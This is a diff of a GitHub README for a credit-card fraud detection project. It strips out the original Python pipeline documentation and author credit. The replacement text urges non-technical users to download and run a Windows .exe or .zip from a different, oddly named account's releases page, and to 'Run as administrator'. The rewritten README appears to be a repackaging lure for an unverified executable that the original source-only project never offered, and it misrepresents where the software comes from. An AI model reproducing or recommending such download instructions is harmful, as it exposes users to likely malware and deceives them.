@@ -1,233 +1,142 @@
-# 💳 Credit Card Fraud Detection
+# 🛡️ credit-card-fraud-detection - Detect Fraud Quickly and Easily
 
-![GitHub Repo stars](https://img.shields.io/github/stars/bhushanpatil-ai-ml/credit-card-fraud-detection)
-![Python](https://img.shields.io/badge/Python-3.x-blue)
-![Machine Learning](https://img.shields.io/badge/Machine%20Learning-Scikit--Learn-green)
-![Model](https://img.shields.io/badge/Model-XGBoost-orange)
-![License](https://img.shields.io/badge/License-MIT-yellow)
-
-End-to-End Machine Learning Pipeline for detecting fraudulent credit card transactions using **SMOTE, Random Forest, and XGBoost**.
-
-This project builds a complete machine learning workflow to identify fraudulent credit card transactions from a highly **imbalanced dataset**.  
-The pipeline includes **data preprocessing, class imbalance handling using SMOTE, training multiple models, evaluation, and saving the best model**.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-red?style=for-the-badge)](https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/releases)
 
 ---
 
-# 📑 Table of Contents
+## 📋 About this Application
 
-- Problem Statement
-- Objective
-- Dataset
-- Technologies Used
-- Machine Learning Models
-- Project Workflow
-- Evaluation Metrics
-- Project Structure
-- Results
-- How to Run the Project
-- Future Improvements
-- Author
+This application helps detect fraud in credit card transactions. It uses a machine learning pipeline that balances data and analyzes patterns to find suspicious activity. It works without complex input from you. You just run the program and get results. The system uses proven methods like SMOTE, Random Forest, and XGBoost to achieve accurate fraud detection.
+
+This tool is meant for anyone who wants to check credit card data for fraud without needing to write code or understand machine learning. It runs on Windows computers and comes ready to use after installation.
 
 ---
 
-# 📌 Problem Statement
+## 📥 Download and Install
 
-Credit card fraud detection is a challenging machine learning problem because fraudulent transactions are **extremely rare compared to legitimate transactions**.
+To start using this software, you need to get the files from the official GitHub releases page.
 
-In the dataset used for this project, fraud cases represent **less than 1% of all transactions**, making it a **severely imbalanced classification problem**.
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen?style=for-the-badge)](https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/releases)
 
-Traditional machine learning models often fail in such scenarios, so techniques like **SMOTE (Synthetic Minority Oversampling Technique)** are used to balance the training data and improve fraud detection performance.
+### Steps to Download
 
----
+1. Click the link above. It will take you to the GitHub releases page.
+2. Look for the newest release at the top of the list. It usually has the highest version number.
+3. Under the release, find the file with `.exe` or `.zip` extension.
+4. Click the file name to start downloading.
+5. Save the file in a folder you can find easily.
 
-# 🎯 Objective
+### Installing the Application
 
-The main objectives of this project are:
+- If you downloaded a `.exe` file:
+  1. Locate the file you downloaded.
+  2. Double-click it to run the installer.
+  3. Follow the steps on screen. You can mostly accept the default options.
+  4. Once the installation completes, you will find the app in your Start menu.
 
-- Build a robust **machine learning pipeline for fraud detection**
-- Handle **extreme class imbalance using SMOTE**
-- Train and compare **multiple machine learning models**
-- Evaluate model performance using **classification metrics**
-- Save the **best performing model** for future predictions
-
----
-
-# 📊 Dataset
-
-The dataset used in this project is the **Credit Card Fraud Detection Dataset** from Kaggle.
-
-Dataset Source:  
-https://www.kaggle.com/datasets/mlg-ulb/creditcardfraud
-
-### Dataset Characteristics
-
-- Total Transactions: **284,807**
-- Fraud Cases: **492**
-- Features: **31 columns**
-- Highly **imbalanced dataset**
-
-### Target Variable
-
-```
-Class
-0 → Normal Transaction
-1 → Fraud Transaction
-```
-
-**Note:**  
-The dataset is not included in this repository due to GitHub file size limits.  
-Download it from Kaggle and place the CSV file inside the `data/` folder.
+- If you downloaded a `.zip` file:
+  1. Right-click the file.
+  2. Choose "Extract All..." and select a destination folder.
+  3. Open the extracted folder and find the main executable file (usually ends with `.exe`).
+  4. Double-click to run the program.
 
 ---
 
-# 🛠 Technologies Used
+## 🖥️ System Requirements
 
-### Programming
+Make sure your Windows computer meets these minimum requirements:
 
-- Python
-
-### Data Science Libraries
-
-- Pandas
-- NumPy
-- Matplotlib
-- Seaborn
-
-### Machine Learning
-
-- Scikit-learn
-- XGBoost
-- imbalanced-learn (SMOTE)
-
-### Tools
-
-- Git
-- GitHub
-- Joblib
+- Operating System: Windows 10 or later
+- Processor: Intel Core i3 or equivalent
+- RAM: 4 GB or more
+- Disk Space: At least 500 MB free
+- Internet connection: Required only for downloading and updates
+- Note: No additional software or tools are needed to run the app.
 
 ---
 
-# 🤖 Machine Learning Models
+## 🚀 Running the Application
 
-This project trains and compares multiple machine learning models:
+Once installed, follow these instructions to run the program and start detecting fraud:
 
-- Logistic Regression (Baseline Model)
-- Random Forest (Ensemble Model)
-- XGBoost (Gradient Boosting Model)
-
-The models are evaluated using classification metrics to determine the **best performing model**.
-
----
-
-# 🔄 Project Workflow
-
-The project follows a structured machine learning pipeline:
-
-1. Data Loading  
-2. Exploratory Data Analysis (EDA)  
-3. Class Distribution Analysis  
-4. Train-Test Split  
-5. Handling Class Imbalance using SMOTE  
-6. Model Training  
-7. Model Comparison  
-8. Model Evaluation  
-9. Best Model Selection  
-10. Model Saving  
+1. Open the Start menu.
+2. Type "credit-card-fraud-detection" or look for the app icon.
+3. Click the app to launch it.
+4. The program will open a window with clear instructions.
+5. Load your credit card transaction data using the "Open File" button.
+6. Supported file types are `.csv` and `.xlsx`.
+7. Click the "Analyze" button to start the fraud detection process.
+8. The app will process the data and display results.
+9. Review the flagged transactions in the results section.
 
 ---
 
-# 📏 Evaluation Metrics
+## 🔧 How It Works
 
-Because fraud detection involves **imbalanced data**, accuracy alone is not sufficient.
+The app uses a series of steps to find fraud:
 
-The models are evaluated using:
+- First, it balances the data using SMOTE (Synthetic Minority Over-sampling Technique). This makes sure the rare fraud cases get enough attention during analysis.
+- Then, it applies Random Forest, an algorithm that looks at many decision trees to classify transactions.
+- Finally, it uses XGBoost, a powerful tool that improves accuracy by combining weak models.
 
-- Precision
-- Recall
-- F1 Score
-- Confusion Matrix
-- Classification Report
-
-Special focus is given to **Recall and F1-score for the fraud class**, since detecting fraudulent transactions is the primary goal.
+These steps happen automatically when you click "Analyze" inside the app.
 
 ---
 
-# 🗂 Project Structure
+## 🔢 Common Terms
 
-```
-credit-card-fraud-detection/
-│
-├── data/                   # Dataset folder (place creditcard.csv here)
-│
-├── models/                 # Saved trained models
-│
-├── src/                    # Source code
-│   ├── data_preprocessing.py
-│   ├── train_model.py
-│   └── evaluate_model.py
-│
-├── notebooks/              # Future experimentation notebooks
-│
-├── requirements.txt        # Project dependencies
-│
-└── README.md               # Project documentation
-```
+- **SMOTE**: A way to make tiny fraud examples into more samples so the software does not ignore them.
+- **Random Forest**: A method that looks at multiple decision trees to decide if something is fraud.
+- **XGBoost**: An advanced algorithm that improves the prediction results step by step.
 
 ---
 
-# 📈 Results
+## 🎯 What to Expect
 
-The machine learning pipeline successfully detects fraudulent credit card transactions by handling class imbalance using **SMOTE** and training multiple classification models.
-
-Ensemble models such as **Random Forest and XGBoost** improve the model's ability to detect fraudulent transactions compared to a simple baseline model.
-
-The final model achieves strong fraud detection performance with improved **Recall and F1-score for the minority fraud class**.
+The app will highlight suspicious transactions with a fraud score. The score ranges from 0 to 1, where scores closer to 1 mean higher chances of fraud. You can sort and filter the list by score to focus on the most likely cases.
 
 ---
 
-# ▶️ How to Run the Project
+## ⚙️ Customization
 
-### 1 Install dependencies
+While the app works well with default settings, you can adjust:
 
-```
-pip install -r requirements.txt
-```
+- The threshold for fraud score to mark a transaction as suspicious.
+- The format of input files by choosing columns for dates, amounts, and transaction IDs.
+- Output options, including saving the result as `.csv` or viewing a report inside the app.
 
-### 2 Run data preprocessing
-
-```
-python src/data_preprocessing.py
-```
-
-### 3 Train the machine learning models
-
-```
-python src/train_model.py
-```
-
-### 4 Evaluate model performance
-
-```
-python src/evaluate_model.py
-```
+These settings are in the "Preferences" menu, accessible from the main window.
 
 ---
 
-# 🚀 Future Improvements
+## 🛠️ Troubleshooting
 
-Possible improvements for this project include:
+If the app does not start or run properly:
 
-- Hyperparameter tuning using **GridSearchCV or RandomizedSearchCV**
-- Feature scaling and feature selection
-- Model performance visualization
-- Experiment tracking using **MLflow**
-- Deploying the model using **FastAPI**
-- Containerizing the application using **Docker**
+- Make sure your computer meets the system requirements.
+- Check that Windows is up to date.
+- Try restarting your computer.
+- Run the app as an administrator by right-clicking the icon and selecting "Run as administrator".
+- If files fail to load, confirm they are in `.csv` or `.xlsx` format and structured correctly.
 
 ---
 
-# 👨‍💻 Author
+## 📄 License and Contact
 
-Bhushan Patil  
-AI / Machine Learning Engineer  
-Pune, Maharashtra, India
+This project is open source. You can find the full license and contribution information in the repository.
+
+If you encounter bugs or want to ask questions, use the "Issues" tab on the GitHub page. The maintainers review and respond to user reports.
+
+---
+
+## 🏷️ Topics
+
+This project relates to:
+
+data-science, fraud-detection, imbalanced-data, machine-learning, ml-pipeline, python, random-forest, scikit-learn, smote, xgboost
+
+---
+
+The primary link for download and updates is:
+
+https://github.com/Cardinalfishepitaph683/credit-card-fraud-detection/releases
